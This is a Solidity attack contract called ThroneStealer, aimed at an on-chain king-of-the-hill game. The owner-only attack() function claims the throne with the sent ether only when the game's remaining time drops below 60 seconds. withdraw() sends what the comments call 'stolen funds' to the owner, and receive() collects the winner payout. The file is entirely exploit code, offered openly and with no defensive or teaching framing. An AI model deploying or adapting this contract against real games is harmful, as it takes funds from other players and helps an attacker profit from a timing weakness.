// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IGame {
    function claimThrone() external payable;
    function declareWinner() external;
    function getRemainingTime() external view returns (uint256);
    function currentKing() external view returns (address);
}

contract ThroneStealer {
    IGame public game;
    address public owner;

    constructor(address _gameAddress) {
        game = IGame(_gameAddress);
        owner = msg.sender;
    }

    // Attack function: Claims throne if grace period is about to expire
    function attack() external payable {
        require(msg.sender == owner, "Only owner can attack");
        
        uint256 remainingTime = game.getRemainingTime();
        
        // If grace period is almost over, claim the throne
        if (remainingTime < 60 seconds) { // Adjust timing based on block speed
            game.claimThrone{value: msg.value}();
        }
    }

    // Withdraw stolen funds
    function withdraw() external {
        require(msg.sender == owner, "Only owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }

    // Needed to receive ETH from `declareWinner`
    receive() external payable {}
}